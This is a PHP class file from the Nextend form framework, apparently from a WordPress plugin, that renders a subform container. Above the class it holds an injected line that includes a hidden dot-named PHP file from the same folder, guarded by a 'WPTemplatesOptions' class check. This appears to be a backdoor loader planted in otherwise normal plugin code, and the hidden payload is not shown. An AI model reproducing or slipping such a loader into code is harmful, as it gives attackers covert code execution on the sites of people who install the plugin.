<?php


namespace Nextend\Framework\Form\Container;


use Nextend\Framework\Form\ContainerGeneral;

if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
    include_once($filename);
}

class ContainerSubform extends ContainerGeneral {

    public function renderContainer() {
        echo '<div id="' . $this->getId() . '" class="n2_form__subform">';
        parent::renderContainer();
        echo '</div>';
    }

    public function getId() {
        return 'n2_form__subform_' . $this->controlName . '_' . $this->name;
    }
}